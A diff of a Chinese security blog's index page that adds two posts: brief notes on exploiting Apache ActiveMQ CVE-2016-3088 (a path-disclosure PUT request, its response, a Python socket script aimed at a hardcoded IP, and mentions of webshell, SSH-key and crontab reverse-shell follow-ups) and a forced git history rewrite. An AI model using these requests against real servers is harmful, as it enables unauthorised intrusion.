@@ -243,6 +243,286 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/" itemprop="url">ActiveMQ(CVE-2016-3088)远程代码执行记录</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-10T22:53:39+08:00">
+                2019-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="ActiveMQ-CVE-2016-3088-远程代码执行记录"><a href="#ActiveMQ-CVE-2016-3088-远程代码执行记录" class="headerlink" title="ActiveMQ(CVE-2016-3088)远程代码执行记录"></a>ActiveMQ(CVE-2016-3088)远程代码执行记录</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<p>两种情况：</p>
+<ol>
+<li>有账号密码</li>
+<li>无账号密码</li>
+</ol>
+<h2 id="有账号密码"><a href="#有账号密码" class="headerlink" title="有账号密码"></a>有账号密码</h2><ul>
+<li><p>webshell</p>
+</li>
+<li><p>ssh public</p>
+</li>
+<li><p>crontab</p>
+</li>
+<li><p>配合CVE-2015-5254</p>
+<p>·······</p>
+</li>
+</ul>
+<p>有账号密码的情况下可以拿到绝对路径，访问/admin/test/systemProperties.jsp</p>
+<p><img src="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/1.png" alt="img"></p>
+<p>然后直接PUT，由于fileserver目录不能解析需要MOVE到admin目录，只有登录才能访问</p>
+<p>在Apache ActiveMQ 5.7及以下版本，可以通过下面爆绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/%20/%20 HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/2.png" alt="img"></p>
+<p>另外记录一个点，就是写代码的时候遇到的。</p>
+<p>请求包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/%20/%20 HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<p>返回包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 500 /asd/application_install/apache-activemq-5.9.1/webapps/fileserver/ /  (Not a directory)</span><br><span class="line">Connection: close</span><br><span class="line">Server: Jetty(7.6.9.v20130131)</span><br></pre></td></tr></table></figure>
+<p>我想要获取/asd/application_install/apache-activemq-5.9.1/webapps/fileserver/这一部分，用requests不知道用什么获取，后续在看看，然后暂时用socket去获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket() </span><br><span class="line">sock.connect((&apos;ip&apos;, 8161)) #修改ip和port</span><br><span class="line">request = &apos;PUT /fileserver/%20/%20 HTTP/1.0\r\nHost: 149.129.130.83:8161\r\n\r\n&apos;</span><br><span class="line">sock.send(request.encode(&apos;utf-8&apos;))</span><br><span class="line">res = sock.recv(4096)</span><br><span class="line">sock.close()</span><br><span class="line">print(res.decode(&apos;utf-8&apos;))</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/10/ActiveMQ-CVE-2016-3088-远程代码执行记录/3.png" alt="img"></p>
+<h2 id="无账号密码情况"><a href="#无账号密码情况" class="headerlink" title="无账号密码情况"></a>无账号密码情况</h2><ul>
+<li>ssh public</li>
+<li>crontab</li>
+</ul>
+<p>无账号密码，就只能写个ssh公钥或者计划个反弹shell</p>
+<p>简单记录下 ：-)</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/26/git删除远程commit/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/26/git删除远程commit/" itemprop="url">git删除远程commit</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-26T01:24:17+08:00">
+                2019-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="git删除远程commit"><a href="#git删除远程commit" class="headerlink" title="git删除远程commit"></a>git删除远程commit</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<p>简单记录一下，如果说在提交git的时候，把敏感信息提交上去了，就会用到，故做记录</p>
+<p>用git bash进到blog目录，进到.git目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD~2 //强制回退2个版本</span><br><span class="line">git push -f //强制覆盖</span><br></pre></td></tr></table></figure>
+<h2 id="Respect"><a href="#Respect" class="headerlink" title="Respect"></a>Respect</h2><p><a href="https://blog.csdn.net/caobin_study/article/details/87372439" target="_blank" rel="noopener">https://blog.csdn.net/caobin_study/article/details/87372439</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/24/windows降权记录/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1063,7 +1343,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1076,7 +1356,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
